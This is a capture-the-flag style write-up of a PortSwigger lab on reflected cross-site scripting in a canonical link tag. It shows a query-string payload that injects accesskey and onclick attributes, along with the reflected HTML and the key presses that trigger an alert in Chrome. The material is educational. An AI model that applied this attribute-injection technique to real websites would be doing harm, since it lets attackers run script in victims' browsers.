# Reflected XSS in canonical link tag

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag), you'll learn: Reflected XSS in canonical link tag! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack on the home page that injects an attribute that calls the `alert` function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

- `ALT+SHIFT+X`
- `CTRL+ALT+X`
- `Alt+X`

Please note that the intended solution to this lab is only possible in Chrome.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-20/images/Pasted%20image%2020221231083133.png)

**View source page:**
```html
<head>
    <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
    <link href=/resources/css/labsBlog.css rel=stylesheet>
    <link rel="canonical" href='https://0a2200b504a6441cc040ccd100c20002.web-security-academy.net/'/>
    <title>Reflected XSS in canonical link tag</title>
</head>
```

In here, we can see that there is a `<link>` tag is using **canonical** link tag.

**To exploit it, we can try to inject `accesskey` attribute with an `onclick` event:**
```html
/?'accesskey='x'onclick='alert(document.domain)
```

**Result:**
```html
<link rel="canonical" href='https://0a2200b504a6441cc040ccd100c20002.web-security-academy.net/?'accesskey='x'onclick='alert(document.domain)'/>
```

**Now press:**

- On Windows: `Alt + Shift + x`
- On MacOS: `Ctrl + Alt + x`
- On Linux: `Alt + x`

> Note: It only works in Chrome browser.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-20/images/Pasted%20image%2020221231084750.png)

Nice!

# What we've learned:

1. Reflected XSS in canonical link tag